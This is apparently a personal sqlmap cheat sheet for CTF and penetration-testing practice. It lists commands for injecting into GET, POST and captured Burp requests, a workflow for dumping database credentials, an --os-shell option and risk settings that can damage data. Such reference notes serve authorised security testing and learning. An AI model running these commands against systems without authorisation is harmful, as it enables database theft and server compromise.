# SQLMap

Reference:

* https://github.com/sqlmapproject/sqlmap/wiki/Usage


## GET url param:

```bash
sqlmap -u http://192.168.217.10/debug.php?id=1 -p "id" --dbms=mysql --dump
```

## POST body:

```bash
sqlmap -u http://10.10.10.10/login.php --method POST --data "username=blah&password=blah&submitButton=Log+In" -p "password"
```

## Captured request (usually POST/PUT):

Save a burp request to a file named `request.txt`:

```bash
sqlmap -r request.txt -p someparam
```

If there is a `Host:` header, then sqlmap will figure out the target on its own. 

Parameters including cookies should also be detected (probably), but don't rely on this to work.

### Example credentials search workflow:

Get database names:

```bash
sqlmap -r request.txt --dbs
```

Get tables of a database:

```bash
sqlmap -r request.txt -D admin --tables
```

Dump content of a table:

```bash
sqlmap -r request.txt -D "admin" -T users --dump
```


## Common Params
### Parameters you want to test specfically

```bash
-p "param,param2"
```

### Discover databases:
```bash
--dbs
```

### Discover Tables:
```bash
-D "database_name"
--tables
```

### Table content:
```bash
-T <table_name>
--dump
```

### Attempt to gain Shell:
```bash
--os-shell
```

### Specify known database type:
```bash
--dbms=mysql
```

### Risk and level
```bash
--level <int>
--risk <int>
```

level max is 5, 

* level 1 default
* level 2 adds HTTP Cookie header testing
* level 3 adds HTTP User-Agent/Referer headers testing
* level 4 ????
* level 5 adds Host header testing

risk max is 3

* risk 1 default
* risk 2 adds heavy query time-based SQL injections
* risk 3 adds OR-based SQL injection tests (might damage database content)


### Get rid of cached session data

Sqlmap tends to cache a lot of data, this might be annoying if there was a false positive or if you changed your captured request file. Do this to get rid of it:

```bash
--flush-session
--fresh-queries
```

### (Burp) Proxy
```bash
-proxy http://localhost:8080
```

### Technique

* Stacked queries (S)
* Union query based (U)
* Error based (E) 
* Inline queries (I)
* Boolean blind (B)
* Time based blind (T)

Specify single technique or technique order

```bash
--technique U
--technique=BEUSTQ
```

For union based attacks you can specify the number of unions cols to test if the default is too small:

```bash
--union-cols=11
--union-cols=1-20
```

### Cookie
```bash
--cookie "cookiename=cookiedata"
```

### Unicode Nonsense

CTFs sometimes do this in order to make it harder for you, they throw in some weird characters which are hard to work with on a utf-8 shell. One of the following parameters might help.

Convert output to hex during retrieval:
```bash
--hex
```

Redump entries having unknown character marker (?)
```bash
--repair
```

Character encoding for data retrieval
```bash
--encoding=
```

### Before and after injection point

If you consistently want to add some string data before/after the injected paylods. For example some brackets that need to be opened/closed to make the injection work.

```bash
--prefix "<str>"
--suffix "<str>"
```

For those who have not paid attention in school, prefix is before, suffix is after.


